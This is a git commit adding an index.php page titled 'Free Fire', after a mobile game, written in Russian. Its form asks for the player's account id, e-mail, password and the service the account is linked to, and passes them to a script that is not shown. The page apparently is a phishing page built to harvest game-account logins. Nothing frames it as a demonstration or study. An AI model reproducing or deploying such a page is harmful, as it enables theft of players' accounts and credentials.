1067e872ccaaf0bb0e5755e05647c344e565c258
Kylychbekov <78838233+Kykychbekov@users.noreply.github.com>
2021-03-07 23:20:15 +0600

    Add files via upload

---
+++ index.php
@@ -0,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <link rel="stylesheet" href="style.css">
+  <title>Free Fire</title>
+</head>
+
+<body>
+	<footer>
+		<h2>Free Fire</h2>
+		<div class="form-container">
+			<div class="note"></div>
+			<div class="fields">
+				<form class="ajax-contact-form" action="">
+					<p><input type="text" name="name" value="" placeholder="id"></p>
+					<div class="row">
+						<div class="col"><input type="email" name="email" value="" placeholder="E-mail"></div>
+						<div class="col"><input type="password" name="tel" value="" placeholder="Пороль"></div>
+						<div class="col"><input type="text" name="tel" value="" placeholder="Куда привязан аккаунт?"></div>
+						</div>
+					<label>Текст</label>
+					<textarea name="message" cols="40" rows="3"></textarea>
+					<input type="submit" name="submit" class="form-container__btn" value="Отправить">
+				</form>
+			</div>
+		</div>
+	</footer>
+	<script src="contactform.js"></script>
+</body>
+
+</html>
